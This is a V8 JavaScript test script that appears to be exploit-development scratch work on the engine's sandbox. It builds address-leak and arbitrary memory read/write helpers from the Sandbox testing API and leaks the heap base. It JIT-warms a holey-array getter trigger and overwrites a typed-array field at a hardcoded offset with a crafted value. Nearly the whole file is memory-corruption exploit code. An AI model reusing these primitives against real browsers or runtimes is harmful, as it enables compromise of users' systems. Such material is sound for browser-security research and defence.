// Copyright 2017 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: r --expose-gc --allow-natives-syntax --sandbox-testing ../../../tests/test4.js
let sandboxMemory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function addrOf(obj) {
    return Sandbox.getAddressOf(obj);
  }
  
  function v8_read64(addr) {
    return sandboxMemory.getBigUint64(Number(addr), true);
  }
  
  function v8_write64(addr, val) {
    return sandboxMemory.setBigInt64(Number(addr), val, true);
  }


Object.prototype.__defineGetter__(0, () => {
  throw Error();
});
var a = [, 0.1];
function foo(i) {
  a[i];
};
for (var i = 0; i < 0x10000; ++i) {
  foo(1);
}
// ============================= read heapbase =============================
let ofs1 = 0x48;
let heap_addr = v8_read64(ofs1) & 0xffffffff00000000n;
console.log("heap_addr: 0x" + heap_addr.toString(16));
/// ========================================================================

const dummy = new Int8Array(150);
console.log("dummy addr: 0x" + (heap_addr + BigInt(addrOf(dummy))).toString(16));
%DebugPrint(dummy);
let base_offset = 0x24af3d+1;
console.log(v8_read64(addrOf(dummy)+base_offset).toString(16));
v8_write64(addrOf(dummy)+base_offset,0x11001002000c0f02n);
console.log(v8_read64(addrOf(dummy)+base_offset).toString(16));
%SystemBreak();
foo(0);